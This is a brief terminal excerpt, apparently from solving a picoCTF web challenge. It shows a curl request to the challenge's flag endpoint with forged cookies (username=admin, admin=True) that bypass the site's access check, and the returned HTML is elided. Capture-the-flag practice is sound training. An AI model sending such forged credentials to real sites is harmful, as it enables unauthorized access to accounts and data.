...
```
eltetor14-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=admin; password=hola; admin=True"
<!DOCTYPE html>
<html lang="en">
...
</html>eltetor14-picoctf@webshell:~$
```
